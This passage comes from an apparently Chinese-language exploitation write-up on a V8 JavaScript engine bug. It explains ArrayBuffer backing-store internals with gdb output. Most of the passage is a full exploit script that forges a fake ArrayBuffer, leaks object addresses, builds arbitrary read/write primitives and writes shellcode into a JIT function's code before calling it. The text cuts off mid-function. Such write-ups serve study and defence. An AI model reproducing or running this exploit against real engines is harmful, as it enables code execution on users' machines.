class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">shellcode_address_ref=<span class="built_in">parseInt</span>(read_obj_addr3(evil_f))+<span class="number">0x38</span><span class="number">-1</span>;</span><br><span class="line">print(shellcode_address_ref.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure></p><p>所以找到这个地址后，我们将其写入fake arraybuffer的backingstore，就能用dataview把这个地址对应的数据读出来。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fake_dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(arrr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x4000</span>);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">shellcode_address =  fake_dv.getFloat64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">print(Int64.fromDouble(shellcode_address).toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure></p><p>但是这个地址，并不是真正的函数对应的执行的代码的入口，它还需要加上0x5f，如图：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ job 0x19d27c522f01</span><br><span class="line">0x19d27c522f01: [Code]</span><br><span class="line">kind = BUILTIN</span><br><span class="line">name = InterpreterEntryTrampoline</span><br><span class="line">compiler = unknown</span><br><span class="line">Instructions (size = 1170)</span><br><span class="line">0x19d27c522f60--&gt;从这开始     0  488b5f2f       REX.W movq rbx,[rdi+0x2f]</span><br><span class="line">0x19d27c522f64     4  488b5b07       REX.W movq rbx,[rbx+0x7]</span><br><span class="line">0x19d27c522f68     8  488b4b0f       REX.W movq rcx,[rbx+0xf]</span><br><span class="line">0x19d27c522f6c     c  f6c101         testb rcx,0x1</span><br><span class="line">0x19d27c522f6f     f  0f8512020000   jnz 0x19d27c523187  (InterpreterEntryTrampoline)</span><br><span class="line">0x19d27c522f75    15  f6c101         testb rcx,0x1</span><br><span class="line">0x19d27c522f78    18  7410           jz 0x19d27c522f8a  (InterpreterEntryTrampoline)</span><br><span class="line">0x19d27c522f7a    1a  48ba000000003d000000 REX.W movq rdx,0x3d00000000</span><br><span class="line">0x19d27c522f84    24  e857350200     call 0x19d27c5464e0  (Abort)    ;; code: BUILTIN</span><br><span class="line">0x19d27c522f89    29  cc             int3l</span><br><span class="line">0x19d27c522f8a    2a  4885c9         REX.W testq rcx,rcx</span><br><span class="line">0x19d27c522f8d    2d  0f842c030000   jz 0x19d27c5232bf  (InterpreterEntryTrampoline)</span><br><span class="line">0x19d27c522f93    33  f6c101         testb rcx,0x1</span><br><span class="line">0x19d27c522f96    36  7410           jz 0x19d27c522fa8  (InterpreterEntryTrampoline)</span><br><span class="line">0x19d27c522f98    38  48ba000000003d000000 REX.W movq rdx,0x3d00000000</span><br></pre></td></tr></table></figure></p><p>于是我们还要再加上0x5f<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode_address=shellcode_address+<span class="keyword">new</span> Int64(<span class="number">0x5f</span>).asDouble();</span><br><span class="line">print(Int64.fromDouble(shellcode_address).toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure></p><h3 id="向函数要执行的代码的地址，写入我们的shellcode"><a href="#向函数要执行的代码的地址，写入我们的shellcode" class="headerlink" title="向函数要执行的代码的地址，写入我们的shellcode"></a>向函数要执行的代码的地址，写入我们的shellcode</h3><p>同上，将函数要执行的代码的地址写入到BackingStore，并用dataview向这个地址写入shellcode。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fake_ab[<span class="number">4</span>]=shellcode_address;</span><br><span class="line">fake_ab[<span class="number">5</span>]=shellcode_address;</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line"><span class="comment">// while(1);</span></span><br><span class="line"><span class="keyword">var</span> shellcode=[<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x782fb848</span>,<span class="number">0x636c6163</span>,<span class="number">0x48500000</span>,<span class="number">0x73752fb8</span>,<span class="number">0x69622f72</span>,<span class="number">0x8948506e</span>,<span class="number">0xc03148e7</span>,<span class="number">0x89485750</span>,<span class="number">0xd23148e6</span>,<span class="number">0x3ac0c748</span>,<span class="number">0x50000030</span>,<span class="number">0x4944b848</span>,<span class="number">0x414c5053</span>,<span class="number">0x48503d59</span>,<span class="number">0x3148e289</span>,<span class="number">0x485250c0</span>,<span class="number">0xc748e289</span>,<span class="number">0x00003bc0</span>,<span class="number">0x050f00</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> value = shellcode[i];</span><br><span class="line">fake_dv.setUint32(i * <span class="number">4</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"go to shellcode!"</span>);</span><br><span class="line">evil_f();</span><br></pre></td></tr></table></figure></p><h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-09-051114.png" alt=""></p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="JSArrayBuffer"><a href="#JSArrayBuffer" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h3><h4 id="ArrayBuffer-and-TypedArray"><a href="#ArrayBuffer-and-TypedArray" class="headerlink" title="ArrayBuffer and TypedArray"></a>ArrayBuffer and TypedArray</h4><ul><li>Originally ArrayBuffer<ul><li>一个可以直接从JavaScript访问内存的特殊数组<ul><li>但是，ArrayBuffer仅准备一个buffer</li><li>BackingStore——可以使用TypedArray/DataView，指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151055.png" alt=""></li><li>为了实际访问，有必要一起使用TypedArray或DataView<br>  <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151829.png" alt=""></li></ul></li><li>使用例子 (TypedArray版本)<ul><li>创建方法1，仅指定长度，初始化为零<br>t_arr = new Uint8Array(128) //ArrayBuffer被创建在内部</li><li>创建方法2，使用特定值初始化<br>t_arr = new Uint8Array([4,3,2,1,0]) //ArrayBuffer被创建在内部</li><li>创建方法3，事先构建缓冲区并使用它<br>arr_buf = new ArrayBuffer(8);<br>t_arr1 = new Uint16Array(arr_buf); //创建一个Uint16数组<br>t_arr2 = new Uint16Array(arr_buf, 0, 4); //或者，您也可以指定数组的开始和结束位置</li></ul></li><li>ArrayBuffer可以在不同的TypedArray之间共享<ul><li>它也可以用于double和int的类型转换<ul><li><strong>类型转换的意义在于改变字节序列的解释，而不是转换</strong></li><li>就像C语言的Union</li></ul></li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-153219.png" alt=""></li><li>①预先准备ArrayBuffer<br>var ab = new ArrayBuffer(0x100);</li><li>②向ArrayBuffer中写入一个Float64的值<br>var t64 = new Float64Array(ab);<br>t64[0] = 6.953328187651540e-310;//字节序列是0x00007fffdeadbeef<br><strong>–&gt;当某些地址在V8上泄露时，通常在大多数情况下被迫将其解释为双精度值，为了正确计算偏移量等，需要将其转换为整数值。 对于完成该转换，ArrayBuffer是最佳的</strong></li><li>③从ArrayBuffer读取两个Uint32<br>var t32 = new Uint32Array(ab);<br>k = [t32[1],t32[0]]<br><strong>–&gt;k是6.953328187651540e-310,将字节序列按照4个字节去分开，然后解释为Uint32,于是得到:</strong><br><strong>k=[0x00007fff，0xdeadbeef]</strong></li></ul></li></ul></li></ul><h4 id="JSArrayBuffer-1"><a href="#JSArrayBuffer-1" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h4><ul><li>持有ArrayBuffer的对象<ul><li>继承Object，HeapObject，JSReceiver，JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-155703.png" alt=""></li></ul></li></ul></li><li>实际演示<ul><li>存放TypedArray</li><li>使用长度0x13370搜索ArrayBuffer的内存位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160126.png" alt=""></li><li>在V8中，对象通常被存放在由GC管理的mapped区域，然而BackingStore是一个不被GC管理的区域，并且被存放在heap中(在图中，可以看到malloc块有prev_size和size成员）<br>此外，由于它不是由GC管理的HeapObject，因此指向BackingStore的指针不是Tagged Value（末尾不能为1）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160917.png" alt=""></li><li>虽然在ArrayBuffer中描述了大小，但如果将此值重写为较大的值，则可以允许读取和写入的长度，超出BackingStore数组的范围。</li><li><strong>同样，如果您可以重写BackingStore指针，则可以读取和写入任意内存地址，这些是在exploit中常用的方法。</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-162614.png" alt=""></li></ul></li></ul><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><p>我写了两个版本的exp，思路一样，但是写法稍微有点不同，版本一相对简洁舒服一些，版本二感觉会稳定一点。</p><h4 id="版本1"><a href="#版本1" class="headerlink" title="版本1"></a>版本1</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">1024</span> * <span class="number">1024</span> *<span class="number">16</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">String</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d2u</span>(<span class="params">num1,num2</span>)</span>&#123;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">    d[<span class="number">0</span>] = num2;</span><br><span class="line">    d[<span class="number">1</span>] = num1;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(d.buffer);</span><br><span class="line">    <span class="keyword">return</span> f[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u2d</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line">    f[<span class="number">0</span>] = num;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(f.buffer);</span><br><span class="line">    <span class="keyword">return</span> d[<span class="number">1</span>] * <span class="number">0x100000000</span> + d[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change_to_float</span>(<span class="params">intarr,floatarr</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; intarr.length;i = i+<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> re = d2u(intarr[i+<span class="number">1</span>],intarr[i]);</span><br><span class="line">        floatarr[j] = re;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak出object的地址，即将一个object当成double读出来</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params">arr,callback</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v=arr[<span class="number">0</span>];</span><br><span class="line">    callback();</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将一个数当成object写进去</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger2</span>(<span class="params">arr, callback, val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v = arr[<span class="number">0</span>];</span><br><span class="line">    callback();</span><br><span class="line">    arr[<span class="number">0</span>] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> nop = <span class="number">0xdaba0000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 伪造ArrayBuffer的map</span></span><br><span class="line"><span class="keyword">var</span> ab_map_obj = [</span><br><span class="line">    nop,nop,</span><br><span class="line">    <span class="number">0x0f00000a</span>,<span class="number">0x001900c6</span>,<span class="number">0x082003ff</span>,<span class="number">0x0</span>,</span><br><span class="line">    nop,nop,   <span class="comment">// use ut32.prototype replace it</span></span><br><span class="line">    nop,nop,<span class="number">0x0</span>,<span class="number">0x0</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">arr0=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"><span class="comment">// leak arraybuffer的prototype和constructor</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr0[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr0, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=u2d(trigger(arr0,evil_r0));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab_proto_addr=read_obj_addr(ab.__proto__);</span><br><span class="line">print(<span class="string">"要被leak的ArrayBuffer"</span>);</span><br><span class="line">%DebugPrint(ab);</span><br><span class="line">print(ab_proto_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_constructor_addr = ab_proto_addr - <span class="number">0x1b0</span>;</span><br><span class="line">print(ab_constructor_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//用ab_proto_addr和ab_constructor_addr替换fake map中的nop</span></span><br><span class="line">ab_map_obj[<span class="number">0x6</span>] = ab_proto_addr &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">ab_map_obj[<span class="number">0x7</span>] = ab_proto_addr / <span class="number">0x100000000</span>;</span><br><span class="line">ab_map_obj[<span class="number">0x8</span>] = ab_constructor_addr &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">ab_map_obj[<span class="number">0x9</span>] = ab_constructor_addr / <span class="number">0x100000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ab_map_obj_float = [<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>];</span><br><span class="line"><span class="comment">// 将int array转换成double array</span></span><br><span class="line">change_to_float(ab_map_obj,ab_map_obj_float);</span><br><span class="line"><span class="comment">// 此处gc是为了将ab_map_obj_float放入到old space里，</span></span><br><span class="line"><span class="comment">// 如果没有gc则ab_map_obj_float会在后续的leak中由于gc而被迁移</span></span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line"><span class="comment">// gc();</span></span><br><span class="line">print(<span class="string">"要leak出的ab_map_obj_float的数组"</span>);</span><br><span class="line">%DebugPrint(ab_map_obj_float);</span><br><span class="line"><span class="comment">// leak ab_map_obj_float的地址</span></span><br><span class="line"></span><br><span class="line">arr1=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr1</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr1[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr1, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=u2d(trigger(arr1,evil_r1));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">ab_map_obj_addr=read_obj_addr1(ab_map_obj_float)+<span class="number">0x280</span>+<span class="number">0x10</span>;</span><br><span class="line">print(ab_map_obj_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab = [</span><br><span class="line">    ab_map_obj_addr &amp; <span class="number">0xffffffff</span>, ab_map_obj_addr / <span class="number">0x100000000</span>,</span><br><span class="line">    ab_map_obj_addr &amp; <span class="number">0xffffffff</span>, ab_map_obj_addr / <span class="number">0x100000000</span>,</span><br><span class="line">    ab_map_obj_addr &amp; <span class="number">0xffffffff</span>, ab_map_obj_addr / <span class="number">0x100000000</span>,</span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0x4000</span>, <span class="comment">/* buffer length */</span></span><br><span class="line">    <span class="number">0x12345678</span>,<span class="number">0x123</span>,<span class="comment">/* buffer address */</span></span><br><span class="line">    <span class="number">0x4</span>,<span class="number">0x0</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">var</span> fake_ab_float = [<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>];</span><br><span class="line">change_to_float(fake_ab,fake_ab_float);</span><br><span class="line">gc();</span><br><span class="line">arr2=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr2</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr2[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr2, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=u2d(trigger(arr2,evil_r2));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"要leak出的fake_ab_float的数组"</span>);</span><br><span class="line">%DebugPrint(fake_ab_float);</span><br><span class="line">fake_ab_float_addr=read_obj_addr2(fake_ab_float)+<span class="number">0x300</span>+<span class="number">0x10</span>;</span><br><span class="line">print(fake_ab_float_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">fake_ab_float_addr_f = d2u(fake_ab_float_addr / <span class="number">0x100000000</span>,fake_ab_float_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">print(fake_ab_float_addr_f + <span class="string">'\n\n\n'</span>);</span><br><span class="line">arrr=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_w0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arrr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">        %DebugPrint(arrr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger2(arrr, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,<span class="number">1.1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print("arrr first is");</span></span><br><span class="line">    <span class="comment">// %DebugPrint(arrr);</span></span><br><span class="line">    trigger2(arrr,evil_w0,fake_ab_float_addr_f);</span><br><span class="line">&#125;</span><br><span class="line">write_obj_addr(fake_ab_float_addr_f);</span><br><span class="line">print(<span class="string">"arrr last is"</span>);</span><br><span class="line">%DebugPrint(arrr);</span><br><span class="line"><span class="comment">//DataView(ArrayBuffer buffer [, 字节起始位置 [, 长度]]);</span></span><br><span class="line">fake_dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(arrr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x4000</span>);</span><br><span class="line">%DebugPrint(fake_dv);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> evil_f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"var a = 1000000"</span>);</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">print(<span class="string">"要read的function"</span>);</span><br><span class="line">%DebugPrint(evil_f);</span><br><span class="line">arr3=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr3</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr3[<span class="number">0</span>] = object;</span><br><span class="line">        %DebugPrint(arr3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr3, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=u2d(trigger(arr3,evil_r3));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">shellcode_address_ref=read_obj_addr3(evil_f)+<span class="number">0x38</span><span class="number">-1</span>;</span><br><span class="line">print(shellcode_address_ref.toString(<span class="number">16</span>));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Read32</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">    fake_ab_float[<span class="number">4</span>] = d2u(addr / <span class="number">0x100000000</span>,addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="comment">//fake_dv = new DataView(fake_arraybuffer,0,0x4000);</span></span><br><span class="line">    <span class="comment">//print(fake_ab_float[4]);</span></span><br><span class="line">    <span class="comment">//get方法的参数都是一个字节序号（不能是负数，否则会报错），表示从哪个字节开始读取。</span></span><br><span class="line">    <span class="comment">//如果一次读取两个或两个以上字节，就必须明确数据的存储方式，到底是小端字节序还是大端字节序。</span></span><br><span class="line">    <span class="comment">//默认情况下，DataView的get方法使用大端字节序解读数据，如果需要使用小端字节序解读，必须在get方法的第二个参数指定true。</span></span><br><span class="line">    <span class="keyword">return</span> fake_dv.getUint32(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Write32</span>(<span class="params">addr,value</span>)</span>&#123;</span><br><span class="line">    fake_ab_float[<span 